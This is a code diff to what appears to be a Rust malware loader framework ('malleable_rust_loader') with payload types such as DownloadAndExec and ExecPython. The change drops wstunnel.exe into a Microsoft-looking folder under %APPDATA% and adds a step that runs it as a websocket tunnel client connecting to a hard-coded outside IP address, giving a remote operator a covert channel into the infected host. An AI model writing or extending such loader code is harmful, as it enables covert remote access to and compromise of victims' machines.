@@ -16,6 +16,7 @@ use malleable_rust_loader::payload::DownloadAndExec;
 use malleable_rust_loader::payload::ExecPython;
 use malleable_rust_loader::payload::Payload;
 use malleable_rust_loader::payload::WriteFile;
+use malleable_rust_loader::payload::Exec;
 use malleable_rust_loader::poollink::Advanced;
 use malleable_rust_loader::poollink::PoolLinks;
 use malleable_rust_loader::poollink::PoolMode;
@@ -176,13 +177,15 @@ exec(decoded_script)
                 jitt: 0,
                 sleep: 0,
             }),
-            out_filepath: String::from("${APPDATA}\\Microsoft\\wstunn\\wstunnel.exe"),
-        })];
-
+            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
+        }),
+        Payload::Exec(Exec {
+            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
+            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:443 --connection-min-idle 5 wss://212.47.242.91:8080")
+        })
+        
+        ];
     } else {
-
-
-
         error!(
             r#"You must choose a payload, from:
 - banner
@@ -196,7 +199,7 @@ exec(decoded_script)
     }
 
     let solar_distance = BTreeMap::new();
-    /* 
+    /*
     let solar_distance = BTreeMap::from([
         (
             1,
